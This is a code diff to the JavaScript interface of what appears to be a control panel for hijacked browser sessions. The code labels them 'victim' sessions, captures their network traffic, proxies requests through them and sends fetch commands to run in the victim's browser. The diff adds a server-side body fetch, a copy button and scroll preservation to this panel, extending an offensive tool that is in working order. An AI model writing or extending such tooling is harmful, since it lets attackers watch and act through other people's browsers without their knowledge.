@@ -990,6 +990,16 @@ function renderNet(){
     }
     return true;
   });
+  // preserve scroll positions across rebuild (response pre + table wrap)
+  var scrollSaves = {}, wrapSt = 0;
+  try {
+    wrapSt = $("ntbl-wrap").scrollTop;
+    ntbody.querySelectorAll(".ndet").forEach(function(nd, di){
+      nd.querySelectorAll("pre").forEach(function(pr, pi){
+        if (pr.scrollTop) scrollSaves[di+":"+pi] = pr.scrollTop;
+      });
+    });
+  } catch(e) {}
   nbdg.textContent=rows.length; nbdg.className="bdg"+(rows.length?" show":"");
   // dynamic method buttons — auto-expose observed methods (incl. WS◀/BEACON)
   var meths=["GET","POST"];
@@ -1032,18 +1042,37 @@ function renderNet(){
          +(r.ro
             ?'<div class="ndet-sec">Resource load</div>'
              +'<div class="ndet-hdr">body/status not exposed by resource timing — re-fetch to capture the response</div>'
-             +'<button class="ndet-pxbtn" data-rf="'+esc(r.url)+'">🔁 Re-fetch body (GET · force-cache)</button>'
+             +'<button class="ndet-pxbtn" data-rf="'+esc(r.url)+'">🔁 Re-fetch (victim)</button>'
+             +'<button class="ndet-pxbtn" data-sf="'+esc(r.url)+'">🌐 Fetch body (server)</button>'
              +'<button class="ndet-pxbtn" data-pu="'+esc(r.url)+'">🔁 Proxy this URL</button>'
             :'<div class="ndet-sec">Response</div>'
              +'<pre>'+esc(prettyBody(r.body||"(empty)", r.ct))+'</pre>'
              +'<button class="ndet-pxbtn" data-pp="'+ni+'">'+(netPretty?"raw":"pretty")+'</button>'
+             +'<button class="ndet-pxbtn" data-cb="'+ni+'">⧉ Copy</button>'
              +'<button class="ndet-pxbtn" data-pu="'+esc(r.url)+'">🔁 Proxy this URL</button>'
             )
          +'</div></td></tr>':'');
   }).join("");
+  // restore scroll positions
+  try {
+    $("ntbl-wrap").scrollTop = wrapSt;
+    ntbody.querySelectorAll(".ndet").forEach(function(nd, di){
+      nd.querySelectorAll("pre").forEach(function(pr, pi){
+        var sv = scrollSaves[di+":"+pi]; if (sv) pr.scrollTop = sv;
+      });
+    });
+  } catch(e) {}
   ntbody.onclick=function(e){
     var ppb=e.target.closest("[data-pp]");
     if (ppb){ netPretty=!netPretty; renderNet(); return; }
+    var sfb=e.target.closest("[data-sf]");
+    if (sfb){ fetchBodyServer(sfb.dataset.sf); return; }
+    var cpb=e.target.closest("[data-cb]");
+    if (cpb){
+      var r0=netRows.slice().reverse()[+cpb.dataset.cb];
+      if (r0) copyText(prettyBody(r0.body||"", r0.ct) || "");
+      return;
+    }
     var rfb=e.target.closest("[data-rf]");
     if (rfb){ sendRefill(rfb.dataset.rf); return; }
     var pxl=e.target.closest("[data-pu]");
@@ -1528,6 +1557,15 @@ $("pxsendbtn").addEventListener("click",function(){
 });
 
 /* ═══════════ Probe panel ═══════════ */
+function fetchBodyServer(url){
+  if (!active){ appendErr("No victim session — select a session first"); return; }
+  fetch("/api/fetchbody?vid="+encodeURIComponent(active)+"&url="+encodeURIComponent(url))
+    .then(function(r){ return r.json(); })
+    .then(function(m){
+      if (m.ok){ loadNet(); }                     // res row now carries the body
+      else appendErr("Server fetch failed: "+(m.error||"unknown"));
+    }).catch(function(e){ appendErr("fetch error: "+e); });
+}
 function sendRefill(url){
   if (!active){ appendErr("No victim session — select a session first"); return; }
   var cmd = "fetch("+JSON.stringify(url)+",{cache:'force-cache'}).catch(function(e){return String(e)})";
